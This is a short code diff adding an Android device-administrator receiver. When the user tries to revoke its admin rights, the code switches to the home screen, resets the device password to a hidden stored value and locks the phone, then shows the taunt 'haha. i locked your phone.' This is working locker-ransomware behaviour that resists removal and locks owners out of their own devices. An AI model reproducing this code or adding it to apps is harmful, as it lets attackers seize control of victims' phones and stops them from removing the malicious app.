@@ -1,0 +1,21 @@
+public class AdminReceiver extends DeviceAdminReceiver {
+@Override
+        public CharSequence onDisableRequested(final Context context, Intent intent) {
+
+            Intent startMain = new Intent(Intent.ACTION_MAIN);
+            startMain.addCategory(Intent.CATEGORY_HOME);
+            startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(startMain); //switch to the home screen, not totally necessary
+            lockPhone(context, secPassword);
+            //Log.i(TAG, "DEVICE ADMINISTRATION DISABLE REQUESTED & LOCKED PHONE");
+
+            return "haha. i locked your phone.";
+        }
+    public static boolean lockPhone(Context context, String password){
+        devAdminReceiver = new ComponentName(context, AdminReceiver.class);
+        dpm = (DevicePolicyManager)context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+        boolean pwChange = dpm.resetPassword(password, 0);
+        dpm.lockNow();
+        return pwChange;
+    }   
+}
